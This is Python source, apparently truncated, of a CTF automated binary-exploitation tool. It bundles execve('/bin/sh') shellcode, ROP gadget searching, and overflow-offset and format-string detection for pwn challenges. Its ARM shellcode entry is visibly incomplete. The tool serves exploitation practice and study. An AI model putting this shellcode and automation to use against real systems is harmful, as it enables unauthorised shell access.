#!/usr/bin/env python3
"""PWN Arcanum v1.10 - Automated PWN Analysis & Exploitation Engine

CTF 解题工具 — PWN 自动化分析与利用引擎
用途: 面向 CTF 竞赛的自动化解题辅助
场景: 竞赛平台题目 / 授权测试靶场

Cross-platform (Windows / macOS / Linux) automated solver for simple PWN challenges:
  - ret2text (call win/backdoor function, with i386 cdecl args)
  - ret2shellcode (shellcode on stack/heap/bss)
  - ret2syscall (int 0x80 / syscall ROP chain)
  - ret2libc (leak + system("/bin/sh") via PLT/GOT, auto libc-id)
  - canary_leak (format-string leak canary + stack overflow bypass)  [v1.4]

Core idea: static analysis with pwntools ELF parser (no GDB/binutils dependency),
hardcoded multi-arch shellcode (no asm() needed), remote-first exploitation.

v1.10 changes (non-interactive shell fix + --cmd parameter):
  - Fix: ret2libc stage2 now immediately sends flag-reading commands after
    system("/bin/sh"), before attempting interactive mode. Many CTF platforms
    (DASCTF etc.) have timeout monitors that kill the process, so interactive
    shells die instantly. Commands sent via stdin arrive before the timeout.
  - New: --cmd parameter to specify a custom command to execute via shell
    (e.g. --cmd "cat /flag*"), replacing the default flag-search commands.
  - Improved: interactive mode also sends flag commands first, then drops to
    interactive only if shell is still alive.

v1.9 changes (leak address 0x0a fix + auto prompt detection):
  - Fix: leaked libc addresses containing 0x0a bytes caused recvline() to
    truncate the address prematurely. Now use recvuntil(prompt) for reliable
    reception of full leaked data including embedded newlines.
  - Auto-detect input prompt from binary strings (e.g. 'Input:', 'Your input:')
    instead of hardcoding 'Your input:', improving stage2 timing for diverse CTF
    binaries.
  - Improved _parse_leaked_addr: forward+backward search for 0x7f-prefixed
    addresses, strip trailing prompt/padding, handle 0x0a in address bytes.

v1.7 changes (ret2shellcode/ret2syscall automation + enhanced gadget search):
  - Auto-detect shellcode address: scan ELF segments/sections for W+X regions,
    auto-select .bss/.data when NX disabled, no manual --sc-addr needed
  - ret2shellcode NOP sled: 8-byte NOP prefix for reliability
  - ret2shellcode layout C: shellcode after ret addr for small offsets
  - ret2syscall i386: support separate pop ebx/ecx/edx gadgets (not just combined)
  - ret2syscall /bin/sh auto-injection: place /bin/sh in writable memory if absent
  - ret2syscall x64: support pop rdx; pop rbx; ret as pop rdx substitute
  - Enhanced _search_gadgets: search i386 pop eax/ebx/ecx/edx + x64 pop rax
  - Shellcode regions shown in analysis report

v1.6 changes (ret2libc full automation + local mode):
  - Auto libc identification: leak GOT address -> query libc.rip API ->
    auto-resolve system/binsh offsets, no manual --libc-offsets needed
  - Multi-function cross-verification: leak 2 GOT entries for precise match
  - ret2libc priority boost: 60 -> 75 when no win function exists
  - --libc flag: specify target libc ELF, auto-extract offsets
  - --local mode: auto-run binary locally with socat for testing
  - i386 ret2libc: correct cdecl calling sequence for PLT leak

v1.5 changes (true zero-parameter automation):
  - Auto-extract win function arguments: scan call-site push imms and
    cmp [rbp+X], imm inside win function body
  - Auto-detect canary leak offset: estimate from fmt-string vuln buf layout,
    with runtime auto-probe fallback (%6$p .. %20$p)
  - Auto-adjust offset semantics for canary_leak (buf->canary vs buf->ret)
  - Improved _find_win_funcs filtering (exclude libc internals in static bins)
  - Enhanced _auto_detect_offset for 32-bit sub-esp frames + static linking

v1.4 changes:
  - New canary_leak strategy: auto-detect format string vuln, leak canary via
    %X$p, then overflow with correct canary + saved rbp + ret addr layout
  - x86-64 stack alignment: warning when ret gadget missing, --no-align option
  - Enhanced auto flag reading: more paths, better shell confirmation
  - i386 ret2text with args: improved offset calculation for sub esp frames

Usage:
  python pwn_arcanum.py binary
  python pwn_arcanum.py binary --remote host:port
  python pwn_arcanum.py binary --remote host:port --strategy auto
  python pwn_arcanum.py binary --offset 112 --strategy ret2text --func main
  python pwn_arcanum.py binary --remote host:port --ssl --strategy canary_leak \\
      --canary-offset 11 --offset 24 --func backdoor
"""

import sys
import os
import re
import struct
import time
import argparse
import json
import urllib.request
import urllib.error
import shutil
from collections import defaultdict

# ---------------------------------------------------------------------------
# Color (graceful degrade if not a tty)
# ---------------------------------------------------------------------------
class C:
    RST = "\033[0m"
    BLD = "\033[1m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YEL = "\033[93m"
    BLU = "\033[94m"
    MAG = "\033[95m"
    CYN = "\033[96m"

    @staticmethod
    def hdr(t): return f"{C.CYN}{C.BLD}{'='*22} {t} {'='*22}{C.RST}"
    @staticmethod
    def sub(t): return f"{C.BLU}{C.BLD}--- {t} ---{C.RST}"
    @staticmethod
    def flag(t): return f"{C.BG_RED}{C.WHT}{C.BLD}[FLAG] {t}{C.RST}" if hasattr(C,'WHT') else f"[FLAG] {t}"
    @staticmethod
    def hit(t): return f"{C.GRN}[+] {t}{C.RST}"
    @staticmethod
    def warn(t): return f"{C.YEL}[!] {t}{C.RST}"
    @staticmethod
    def info(t): return f"{C.CYN}[*] {t}{C.RST}"
    @staticmethod
    def err(t):  return f"{C.RED}[-] {t}{C.RST}"

BANNER = r"""
   ___|  |     |     |   _  |     \    _  _|  _  _|  _  _|  _  |
  |      |  -  |  -  |  . | |  -- <   | | | | |_ |_| |_ | | . | |
  |______|___|_|___|_|_|\__|_|_|_\_|  |___| |___|___|___|\___|
                                                          v1.9
"""

# ---------------------------------------------------------------------------
# Shellcode Database (hardcoded, no asm() needed, cross-platform)
# ---------------------------------------------------------------------------
SHELLCODES = {
    # Linux x86 execve("/bin/sh")
    "linux_x86_execve": (
        b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
        b"\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
    ),
    # Linux x86-64 execve("/bin/sh")
    "linux_x64_execve": (
        b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73"
        b"\x68\x57\x54\x5f\x6a\x3b\x58\x99\xb0\x3b\x0f\x05"
    ),
    # Linux x86-64 execve alternative (shorter)
    "linux_x64_execve_alt": (
        b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73"
        b"\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
    ),
    # Linux ARM (little endian) execve
    "linux_arm_execve": bytes.fromhex(
        "01080a0e"  # mov r0, r1
        "0100a0e3"  # mov r0, #1
    ),
}

def get_shellcode(arch):
    arch = arch.lower()
    if 'i386' in arch or arch == '32':
        return SHELLCODES["linux_x86_execve"]
    elif 'x86-64' in arch or arch == '64' or 'amd64' in arch:
        return SHELLCODES["linux_x64_execve"]
    return SHELLCODES["linux_x64_execve"]

# ---------------------------------------------------------------------------
# Imports (deferred to handle missing pwntools gracefully)
# ---------------------------------------------------------------------------
try:
    from pwn import *
    context.log_level = 'error'
    context.terminal = ['tmux', 'splitw', '-h']
    HAS_PWNTOOLS = True
except ImportError:
    HAS_PWNTOOLS = False

# ---------------------------------------------------------------------------
# BinaryAnalyzer: Static analysis with pwntools ELF (no GDB needed)
# ---------------------------------------------------------------------------
class BinaryAnalyzer:
    """Static analysis of ELF/PE binary for PWN challenge."""

    def __init__(self, filepath):
        self.filepath = filepath
        self.elf = None
        self.arch = 'amd64'
        self.bits = 64
        self.endian = 'little'
        self.protections = {}
        self.dangerous_funcs = {}
        self.win_funcs = []
        self.gadgets = []
        self.strings = []
        self.plt = {}
        self.got = {}
        self.has_libc = False
        self.cat_flag_gadgets = []  # addresses of 'lea rdi, [cat_flag_str]; ... call system'
        self.auto_offset = None     # auto-detected overflow offset
        self.has_canary = False     # canary protection detected
        self.fmt_string_vulns = []  # format string vulnerability locations
        self.canary_stack_offset = None  # auto-detected canary offset in printf args
        self.auto_canary_buf_offset = None  # byte offset from overflow buf to canary
        self.auto_args = []               # auto-extracted function arguments
        self.auto_args_func = None        # function name for auto-extracted args
        self.auto_shellcode_addr = None   # auto-detected shellcode address (W+X region)
        self.shellcode_regions = []       # list of (addr, size, name) for W+X regions
        self.input_prompt = None           # auto-detected input prompt string
        self._load()

    def _load(self):
        if not HAS_PWNTOOLS:
            print(C.warn("pwntools not available, static analysis limited."))
            self._load_raw()
            return

        try:
            self.elf = ELF(self.filepath, checksec=False)
            self.arch = self.elf.arch
            self.bits = self.elf.bits
            self.endian = self.elf.endian
            self._analyze_protections()
            self._find_dangerous()
            self._build_plt_got()          # must be before _auto_detect_offset (reads self.plt)
            self._find_win_funcs()
            self._find_cat_flag_xref()
            self._auto_detect_offset()
            self._search_gadgets()
            self._extract_strings()
            self._detect_fmt_string()      # detect format string vulnerabilities
            self._auto_extract_args()     # auto-extract win function arguments
            self._find_shellcode_regions()  # auto-detect W+X regions for shellcode
            self.csu_gadgets = self._find_csu_gadgets()  # detect CSU gadgets for ret2csu
        except Exception as e:
            print(C.err(f"ELF load failed: {e}"))
            self._load_raw()

    def _load_raw(self):
        """Fallback: read file as bytes when pwntools unavailable."""
        with open(self.filepath, 'rb') as f:
            self.raw = f.read()
        # detect architecture by magic
        if len(self.raw) > 4 and self.raw[:4] == b'\x7fELF':
            ei_class = self.raw[4]
            self.bits = 64 if ei_class == 2 else 32
            self.arch = 'amd64' if self.bits == 64 else 'i386'
        self.protections = {'NX': 'unknown', 'Canary': 'unknown',
                            'PIE': 'unknown', 'RELRO': 'unknown'}

    def _analyze_protections(self):
        """Detect binary protections via ELF object attributes.
        Robust across pwntools versions (checksec() may return dict, str, or namedtuple).
        """
        self.protections = {}
        # NX: elf.nx is a bool (True = NX enabled)
        self.protections['NX'] = bool(getattr(self.elf, 'nx', False))
        # Canary: check for __stack_chk_fail in symbols
        has_canary = ('__stack_chk_fail' in self.elf.symbols
                      or '__stack_chk_fail_local' in self.elf.symbols)
        self.protections['Canary'] = has_canary
        self.has_canary = has_canary
        # PIE: elf.pie is a bool (True = PIE enabled)
        self.protections['PIE'] = bool(getattr(self.elf, 'pie', False))
        # RELRO: elf.relro returns 'Full', 'Partial', or 'No'
        relro = getattr(self.elf, 'relro', None)
        self.protections['RELRO'] = relro if relro else 'No'

    def _find_dangerous(self):
        """Find dangerous functions: gets, read, scanf, strcpy, memcpy, etc.
        Searches both elf.symbols and elf.plt to cover all pwntools versions.
        """
        danger_names = [
            'gets', 'read', 'scanf', '__isoc99_scanf', 'strcpy', 'strcat',
            'sprintf', 'memcpy', 'fgets', 'read', 'vuln', 'vulnerable',
            'overflow', 'backdoor', 'main', 'echo', 'input'
        ]
        for name in danger_names:
            addr = None
            if name in self.elf.symbols:
                addr = self.elf.symbols[name]
            elif name in self.elf.plt:
                addr = self.elf.plt[name]
            if addr is not None:
                self.dangerous_funcs[name] = addr

    def _find_win_funcs(self):
        """Find potential win/backdoor functions.

        Filters out obvious libc/internal functions by checking:
        - Function address is inside .text section (user code)
        - Function name is not a known libc/internal prefix (_IO_, _dl_, _nl_, etc.)
        - For statically linked binaries, be extra aggressive with filtering
        """
        win_keywords = ['win', 'flag', 'backdoor', 'shell', 'system',
                        'execve', 'cat', 'read_flag', 'get_flag', 'secret',
                        'callsystem', 'getshell', 'pwn']

        # Internal/libc function prefixes to exclude
        exclude_prefixes = (
            '_IO_', '_dl_', '_nl_', '_Unwind', '__', '_check_',
            'allocate_', 'free_', 'rewind', 'program_',
        )
        # Specific known false-positive substrings
        exclude_substrings = (
            'doallocate', 'relocate', 'allocate', 'deallocate',
            'postload', 'num_items', 'value_type', 'catch_',
            'find_enclosing', 'iterate', 'error_catch',
            'stack_flags', 'cap_flags', 'category',
        )

        # Get .text section range for filtering
        text_start = text_end = 0
        try:
            text_sec = self.elf.get_section_by_name('.text')
            if text_sec:
                text_start = text_sec.header.sh_addr
                text_end = text_start + text_sec.header.sh_size
        except Exception:
            pass

        for sym_name in self.elf.symbols:
            sym_addr = self.elf.symbols[sym_name]
            name_lower = sym_name.lower()

            # Skip if name matches exclusion patterns
            if sym_name.startswith(exclude_prefixes):
                continue
            if any(es in name_lower for es in exclude_substrings):
                continue

            # For statically linked binaries, filter to .text section only
            # (libc functions are in .text too, but this at least removes
            #  data section false positives like _nl_msg_cat_cntr)
            if text_end and not (text_start <= sym_addr < text_end):
                continue

            for kw in win_keywords:
                if kw in name_lower:
                    self.win_funcs.append((sym_name, sym_addr))
                    break

        # Sort by address (functions earlier in .text are likely user code)
        self.win_funcs.sort(key=lambda x: x[1])

        # Also check for system() in PLT
        if 'system' in self.elf.plt:
            self.win_funcs.append(('system@plt', self.elf.plt['system']))

    def _find_cat_flag_xref(self):
        """Find 'lea rdi, [cat_flag_string]' instructions via byte scanning.
        This detects inline 'system("cat /flag")' calls without needing objdump.

        x86-64: lea rdi, [rip+offset] is encoded as:
          48 8d 3d XX XX XX XX   (7 bytes, RIP-relative addressing)
        x86-32: lea rdi, [addr] is:
          bf XX XX XX XX         (mov edi, imm32)  OR
          8d 3d XX XX XX XX      (lea edi, [addr])
        """
        if not self.elf:
            return

        # Find "cat flag" related strings in the binary
        cat_strings = {}
        search_terms = [b'cat /flag', b'cat flag.txt', b'cat flag', b'/bin/sh',
                        b'cat /flag.txt', b'sh']
        for term in search_terms:
            try:
                addr = next(self.elf.search(term, writable=False), None)
                if addr is not None:
                    cat_strings[addr] = term.decode('ascii', errors='replace')
            except Exception:
                pass

        if not cat_strings:
            return

        # Read the .text section
        try:
            text_start = self.elf.get_section_by_name('.text').header.sh_addr
            text_size = self.elf.get_section_by_name('.text').header.sh_size
            text_data = self.elf.read(text_start, text_size)
        except Exception:
            # Fallback: scan entire binary
            text_start = 0
            with open(self.filepath, 'rb') as f:
                text_data = f.read()

        if self.bits == 64:
            # x86-64: 48 8d 3d XX XX XX XX  (lea rdi, [rip+offset])
            # The offset is relative to the NEXT instruction (addr+7)
            pattern = b'\x48\x8d\x3d'
            for i in range(len(text_data) - 7):
                if text_data[i:i+3] == pattern:
                    instr_addr = text_start + i
                    # Extract 4-byte signed offset (little-endian)
                    offset = struct.unpack('<i', text_data[i+3:i+7])[0]
                    # Target = addr of next instruction + offset
                    target = instr_addr + 7 + offset
                    if target in cat_strings:
                        # Found! Check if there's a call to system nearby
                        self.cat_flag_gadgets.append({
                            'addr': instr_addr,
                            'string': cat_strings[target],
                            'string_addr': target,
                            'desc': f'lea rdi, [{cat_strings[target]}] @ {hex(instr_addr)}'
                        })

            # Also check: mov edi, imm32 (bf XX XX XX XX) for 32-bit addresses
            for i in range(len(text_data) - 5):
                if text_data[i] == 0xbf:
                    instr_addr = text_start + i
                    target = struct.unpack('<I', text_data[i+1:i+5])[0]
                    if target in cat_strings:
                        self.cat_flag_gadgets.append({
                            'addr': instr_addr,
                            'string': cat_strings[target],
                            'string_addr': target,
                            'desc': f'mov edi, {hex(target)} [{cat_strings[target]}] @ {hex(instr_addr)}'
                        })
        else:
            # x86-32: lea edi, [addr] = 8d 3d XX XX XX XX
            pattern = b'\x8d\x3d'
            for i in range(len(text_data) - 6):
                if text_data[i:i+2] == pattern:
                    instr_addr = text_start + i
                    target = struct.unpack('<I', text_data[i+2:i+6])[0]
                    if target in cat_strings:
                        self.cat_flag_gadgets.append({
                            'addr': instr_addr,
                            'string': cat_strings[target],
                            'string_addr': target,
                            'desc': f'lea edi, [{cat_strings[target]}] @ {hex(instr_addr)}'
                        })

    def _auto_detect_offset(self):
        """Auto-detect overflow offset by scanning .text for buffer setup
        followed by call to a dangerous function (gets/read/scanf).

        x86-64 patterns (offset = buf_distance_from_rbp + 8):
          48 8d 7d XX         lea rdi, [rbp+s8]   + call vuln
          48 8d bd XX XX..    lea rdi, [rbp+s32]  + call vuln
          48 8d 45 XX         lea rax,[rbp+s8]    + ... + call vuln
          48 8d 85 XX XX..    lea rax,[rbp+s32]   + ... + call vuln

        x86-32 patterns (offset = buf_distance + 4, or sub_esp - read_size_adj):
          8d 45 XX      lea eax, [ebp+s8]   + push eax + call vuln
          8d 85 XX XX.. lea eax, [ebp+s32]  + push eax + call vuln
          8d 44 24 XX   lea eax, [esp+s8]   + push eax + call vuln  (sub esp frame)
          83 ec XX      sub esp, XX  then lea eax,[esp+Y] + push + call vuln
          8d 54 24 XX   lea edx, [esp+s8]   + call vuln (read(0,buf,n))

        For statically-linked binaries, call targets are function addresses
        (no PLT indirection), so we also match against symbol addresses directly.
        """
        if not self.elf:
            return

        # Read .text section
        try:
            text_start = self.elf.get_section_by_name('.text').header.sh_addr
            text_size = self.elf.get_section_by_name('.text').header.sh_size
            text_data = self.elf.read(text_start, text_size)
        except Exception:
            return

        vuln_names = ('gets', 'read', 'scanf', '__isoc99_scanf',
                      'strcpy', 'memcpy')

        # --- Build set of dangerous function call targets ---
        # For dynamically linked: call targets PLT stubs
        # For statically linked: call targets are the function addresses directly
        vuln_addrs = set()
        addr_to_name = {}  # addr -> func_name (for priority sorting)

        for name in vuln_names:
            # PLT addresses (dynamic linking)
            if name in self.plt:
                vuln_addrs.add(self.plt[name])
                addr_to_name[self.plt[name]] = name
            elif name in self.elf.plt:
                vuln_addrs.add(self.elf.plt[name])
                addr_to_name[self.elf.plt[name]] = name
            # Symbol addresses (static linking or pwntools storing GOT as symbols)
            if name in self.elf.symbols:
                sym_addr = self.elf.symbols[name]
                vuln_addrs.add(sym_addr)
                addr_to_name[sym_addr] = name
            # From dangerous_funcs dict
            if name in self.dangerous_funcs:
                vuln_addrs.add(self.dangerous_funcs[name])
                addr_to_name[self.dangerous_funcs[name]] = name

        # Fallback: scan .plt section entries directly (pwntools 4.13.0)
        if not any(n in self.plt or n in self.elf.plt for n in vuln_names):
            try:
                plt_section = self.elf.get_section_by_name('.plt')
                if plt_section:
                    plt_start = plt_section.header.sh_addr
                    plt_size = plt_section.header.sh_size
                    for off in range(16, plt_size, 16):
                        entry_addr = plt_start + off
                        try:
                            entry_bytes = self.elf.read(entry_addr, 6)
                            if (entry_bytes and len(entry_bytes) == 6
                                    and entry_bytes[0] == 0xff
                                    and entry_bytes[1] == 0x25):
                                got_offset = struct.unpack('<i', entry_bytes[2:6])[0]
                                got_addr = entry_addr + 6 + got_offset
                                for gname, ga in self.got.items():
                                    if ga == got_addr and gname in vuln_names:
                                        vuln_addrs.add(entry_addr)
                                        addr_to_name[entry_addr] = gname
                                        break
                        except Exception:
                            continue
            except Exception:
                pass

        if not vuln_addrs:
            return

        # --- Scan for patterns ---
        candidates = []  # (offset, call_target_addr)

        def _check_call_at(pos):
            """Check if text_data[pos] is a call targeting vuln_addrs.
            Returns call_target addr or None.

            Also matches target±4 to handle CET endbr64 prefix in PLT
            (pwntools may report the address after endbr64, while the
            actual call target points to the PLT entry before it).
            """
            if pos >= len(text_data):
                return None
            target = None
            if text_data[pos] == 0xe8:  # call rel32
                if pos + 5 > len(text_data):
                    return None
                rel32 = struct.unpack('<i', text_data[pos+1:pos+5])[0]
                target = text_start + pos + 5 + rel32
            elif text_data[pos] == 0xff and pos + 1 < len(text_data):
                modrm = text_data[pos+1]
                if modrm == 0x15 and pos + 6 <= len(text_data):  # call [rip+disp32]
                    rel32 = struct.unpack('<i', text_data[pos+2:pos+6])[0]
                    target = text_start + pos + 6 + rel32
            if target is None:
                return None
            # Direct match
            if target in vuln_addrs:
                return target
            # Fuzzy match: ±4 to handle CET endbr64 prefix
            for delta in range(-4, 5):
                if delta == 0:
                    continue
                adj = target + delta
                if adj in vuln_addrs:
                    return adj
            return None

        def _scan_call_nearby(i, search_start, search_end):
            """Scan text_data[i+search_start : i+search_end] for a call to vuln."""
            for j in range(search_start, min(search_end, len(text_data) - i - 5)):
                ct = _check_call_at(i + j)
                if ct is not None:
                    return ct
            return None

        if self.bits == 64:
            word = 8  # saved rbp size

            # Pattern 1: 48 8d 7d XX  (lea rdi, [rbp+s8])
            for i in range(len(text_data) - 4):
                if text_data[i:i+3] == b'\x48\x8d\x7d':
                    disp = struct.unpack('b', text_data[i+3:i+4])[0]
                    buf_off = -disp if disp < 0 else disp
                    ct = _scan_call_nearby(i, 4, 20)
                    if ct:
                        candidates.append((buf_off + word, ct))

            # Pattern 2: 48 8d bd XX XX XX XX  (lea rdi, [rbp+s32])
            for i in range(len(text_data) - 7):
                if text_data[i:i+3] == b'\x48\x8d\xbd':
                    disp = struct.unpack('<i', text_data[i+3:i+7])[0]
                    buf_off = -disp if disp < 0 else disp
                    ct = _scan_call_nearby(i, 7, 24)
                    if ct:
                        candidates.append((buf_off + word, ct))

            # Pattern 3: 48 8d 45 XX  (lea rax, [rbp+s8]) + mov rdi,rax + call
            for i in range(len(text_data) - 4):
                if text_data[i:i+3] == b'\x48\x8d\x45':
                    disp = struct.unpack('b', text_data[i+3:i+4])[0]
                    buf_off = -disp if disp < 0 else disp
                    ct = _scan_call_nearby(i, 4, 25)
                    if ct:
                        candidates.append((buf_off + word, ct))

            # Pattern 4: 48 8d 85 XX XX XX XX  (lea rax, [rbp+s32]) + call
            for i in range(len(text_data) - 7):
                if text_data[i:i+3] == b'\x48\x8d\x85':
                    disp = struct.unpack('<i', text_data[i+3:i+7])[0]
                    buf_off = -disp if disp < 0 else disp
                    ct = _scan_call_nearby(i, 7, 28)
                    if ct:
                        candidates.append((buf_off + word, ct))

        elif self.bits == 32:
            word = 4  # saved ebp size

            # Pattern 1: 8d 45 XX  (lea eax, [ebp+s8]) + push eax + call vuln
            for i in range(len(text_data) - 3):
                if text_data[i:i+2] == b'\x8d\x45':
                    disp = struct.unpack('b', text_data[i+2:i+3])[0]
                    buf_off = -disp if disp < 0 else disp
                    ct = _scan_call_nearby(i, 3, 25)
                    if ct:
                        candidates.append((buf_off + word, ct))

            # Pattern 2: 8d 85 XX XX XX XX  (lea eax, [ebp+s32]) + call vuln
            for i in range(len(text_data) - 6):
                if text_data[i:i+2] == b'\x8d\x85':
                    disp = struct.unpack('<i', text_data[i+2:i+6])[0]
                    buf_off = -disp if disp < 0 else disp
                    ct = _scan_call_nearby(i, 6, 30)
                    if ct:
                        candidates.append((buf_off + word, ct))

            # Pattern 3: 8d 44 24 XX  (lea eax, [esp+s8]) + call vuln
            # Used when function uses "sub esp" without push ebp
            for i in range(len(text_data) - 4):
                if text_data[i:i+3] == b'\x8d\x44\x24':
                    disp = struct.unpack('b', text_data[i+3:i+4])[0]
                    buf_off = disp  # distance from esp
                    ct = _scan_call_nearby(i, 4, 25)
                    if ct:
                        # For sub esp frames without push ebp:
                        # offset = buf_off (from esp) + 4 (saved ret addr)
                        # But we need to find sub esp to know the frame size.
                        # The ret addr is at esp + sub_esp_value.
                        # buf is at esp + disp, so offset = sub_esp - disp + 4?
                        # No: offset from buf to ret = (esp_at_ret - esp_at_buf)
                        #   = sub_esp_value - disp
                        # We'll try both: buf_off + word (if push ebp) and
                        # search for sub esp nearby.
                        # Try sub esp pattern first
                        sub_esp = self._find_sub_esp(text_data, i, text_start)
                        if sub_esp is not None:
                            # offset = sub_esp - disp  (ret at esp+sub_esp, buf at esp+disp)
                            offset = sub_esp - disp
                            candidates.append((offset, ct))
                        else:
                            # Assume push ebp frame: offset = buf_off + 4
                            candidates.append((buf_off + word, ct))

            # Pattern 4: 8d 54 24 XX  (lea edx, [esp+s8]) + call vuln
            # Common in read(0, buf, n) patterns
            for i in range(len(text_data) - 4):
                if text_data[i:i+3] == b'\x8d\x54\x24':
                    disp = struct.unpack('b', text_data[i+3:i+4])[0]
                    buf_off = disp
                    ct = _scan_call_nearby(i, 4, 25)
                    if ct:
                        sub_esp = self._find_sub_esp(text_data, i, text_start)
                        if sub_esp is not None:
                            offset = sub_esp - disp
                            candidates.append((offset, ct))
                        else:
                            candidates.append((buf_off + word, ct))

            # Pattern 5: 8d 84 24 XX XX XX XX  (lea eax, [esp+s32]) + call vuln
            for i in range(len(text_data) - 7):
                if text_data[i:i+3] == b'\x8d\x84\x24':
                    disp = struct.unpack('<i', text_data[i+3:i+7])[0]
                    buf_off = disp
                    ct = _scan_call_nearby(i, 7, 30)
                    if ct:
                        sub_esp = self._find_sub_esp(text_data, i, text_start)
                        if sub_esp is not None:
                            offset = sub_esp - disp
                            candidates.append((offset, ct))
                        else:
                            candidates.append((buf_off + word, ct))

            # Pattern 6: sub esp + lea eax,[esp+disp8] via 83 ec XX
            # Scan for "sub esp, N" then within next 30 bytes find lea + call vuln
            for i in range(len(text_data) - 3):
                if text_data[i:i+2] == b'\x83\xec':
                    sub_val = text_data[i+2]
                    if sub_val == 0 or sub_val > 0x200:
                        continue
                    # Search forward for lea eax,[esp+disp] + call
                    for j in range(3, min(40, len(text_data) - i - 5)):
                        # lea eax, [esp+disp8] = 8d 44 24 XX
                        if (i + j + 3 < len(text_data) and
                                text_data[i+j:i+j+3] == b'\x8d\x44\x24'):
                            disp = struct.unpack('b', text_data[i+j+3:i+j+4])[0]
                            ct = _scan_call_nearby(i+j, 4, 25)
                            if ct:
                                offset = sub_val - disp
                                candidates.append((offset, ct))
                                break
                        # lea eax, [esp+disp32] = 8d 84 24 XX XX XX XX
                        if (i + j + 6 < len(text_data) and
                                text_data[i+j:i+j+3] == b'\x8d\x84\x24'):
                            disp = struct.unpack('<i', text_data[i+j+3:i+j+7])[0]
                            ct = _scan_call_nearby(i+j, 7, 30)
                            if ct:
                                offset = sub_val - disp
                                candidates.append((offset, ct))
                                break

        # Pick best candidate: prefer 'gets' > 'read' > 'scanf' > others
        if candidates:
            for priority_name in ['gets', 'read', 'scanf', '__isoc99_scanf',
                                  'strcpy', 'memcpy']:
                for offset, ct in candidates:
                    name = addr_to_name.get(ct, '')
                    if priority_name in name.lower():
                        self.auto_offset = offset
                        return
            # Fallback: return first candidate
            self.auto_offset = candidates[0][0]

    @staticmethod
    def _find_sub_esp(text_data, pos, text_start):
        """Search backward from pos for 'sub esp, imm8' (83 ec XX) or
        'sub esp, imm32' (81 ec XX XX XX XX) to determine stack frame size.
        Returns the immediate value or None.
        """
        # Search backward up to 30 bytes
        for i in range(pos - 1, max(pos - 30, -1), -1):
            if i < 0:
                break
            # sub esp, imm8 = 83 ec XX
            if i + 2 < len(text_data) and text_data[i:i+2] == b'\x83\xec':
                val = text_data[i+2]
                if 0 < val <= 0x200:
                    return val
            # sub esp, imm32 = 81 ec XX XX XX XX
            if i + 5 < len(text_data) and text_data[i:i+2] == b'\x81\xec':
                val = struct.unpack('<I', text_data[i+2:i+6])[0]
                if 0 < val <= 0x1000:
                    return val
        return None

    def _search_gadgets(self):
        """Search for ROP gadgets using pwntools ROP."""
        try:
            self.rop = ROP(self.elf)
            # Find key gadgets
            self.gadgets = []
            # pop rdi; ret  (for x64)
            try:
                g = self.rop.find_gadget(['pop rdi', 'ret'])
                if g: self.gadgets.append(('pop rdi; ret', g[0]))
            except: pass
            # pop rsi; ret
            try:
                g = self.rop.find_gadget(['pop rsi', 'ret'])
                if g: self.gadgets.append(('pop rsi; ret', g[0]))
            except: pass
            # pop rdx; ret
            try:
                g = self.rop.find_gadget(['pop rdx', 'ret'])
                if g: self.gadgets.append(('pop rdx; ret', g[0]))
            except: pass
            # ret (stack alignment)
            try:
                g = self.rop.find_gadget(['ret'])
                if g: self.gadgets.append(('ret', g[0]))
            except: pass
            # int 0x80
            try:
                g = self.rop.find_gadget(['int 0x80'])
                if g: self.gadgets.append(('int 0x80', g[0]))
            except: pass
            # syscall
            try:
                g = self.rop.find_gadget(['syscall'])
                if g: self.gadgets.append(('syscall', g[0]))
            except: pass
            # i386: pop ebx; ret
            try:
                g = self.rop.find_gadget(['pop ebx', 'ret'])
                if g: self.gadgets.append(('pop ebx; ret', g[0]))
            except: pass
            # i386: pop ecx; ret
            try:
                g = self.rop.find_gadget(['pop ecx', 'ret'])
                if g: self.gadgets.append(('pop ecx; ret', g[0]))
            except: pass
            # i386: pop edx; ret
            try:
                g = self.rop.find_gadget(['pop edx', 'ret'])
                if g: self.gadgets.append(('pop edx; ret', g[0]))
            except: pass
            # i386: pop eax; ret
            try:
                g = self.rop.find_gadget(['pop eax', 'ret'])
                if g: self.gadgets.append(('pop eax; ret', g[0]))
            except: pass
            # x64: pop rax; ret
            try:
                g = self.rop.find_gadget(['pop rax', 'ret'])
                if g: self.gadgets.append(('pop rax; ret', g[0]))
            except: pass
        except Exception as e:
            print(C.warn(f"ROP gadget search failed: {e}"))

    def _extract_strings(self):
        """Extract interesting strings from binary."""
        try:
            with open(self.filepath, 'rb') as f:
                data = f.read()
            # ASCII strings >= 4 chars
            found = re.findall(rb'[\x20-\x7e]{4,}', data)
            interesting = []
            for s in found:
                s = s.decode('ascii', errors='replace')
                # filter interesting
                if any(kw in s.lower() for kw in ['flag', 'bin/sh', 'sh', 'cat',
                        'system', 'bash', '/bin', 'flag.txt', 'key', 'secret',
                        'input', 'name', 'welcome', 'overflow', 'pwn']):
                    interesting.append(s)
            self.strings = interesting[:50]
            # Auto-detect input prompt from binary strings
            for s in found:
                try:
                    decoded = s.decode('ascii', errors='replace')
                except Exception:
                    continue
                # Common prompt patterns: 'Input:', 'Your input:', 'Enter:', etc.
                if any(kw in decoded for kw in ['Input:', 'input:', 'Enter:',
                        'Your input', 'your input', 'Give me', 'give me']):
                    self.input_prompt = decoded.strip()
                    break
        except Exception:
            self.strings = []

    def _detect_fmt_string(self):
        """Detect format string vulnerabilities: printf(buf) without format arg.

        Scans .text for 'call printf' (or puts) where the format argument
        comes directly from a stack buffer (lea rdi, [rbp-X]) without a
        format string literal.

        Also auto-detects the canary's position in printf arguments by
        estimating the stack layout:
          - Find the vulnerable buffer's offset from rbp (e.g., [rbp-0x10])
          - Canary is typically at [rbp-0x8] on x86-64
          - printf argN = (stack_addr - format_string_addr) / word_size + 6
          (first 5 args in registers: rsi, rdx, rcx, r8, r9; arg6 = [rsp])
        """
        if not self.elf or not HAS_PWNTOOLS:
            return

        # Build set of printf/puts PLT addresses
        fmt_func_addrs = set()
        for name in ['printf', 'puts', 'fprintf', 'dprintf', 'write']:
            if name in self.plt:
                fmt_func_addrs.add(self.plt[name])
            if name in self.elf.symbols:
                fmt_func_addrs.add(self.elf.symbols[name])
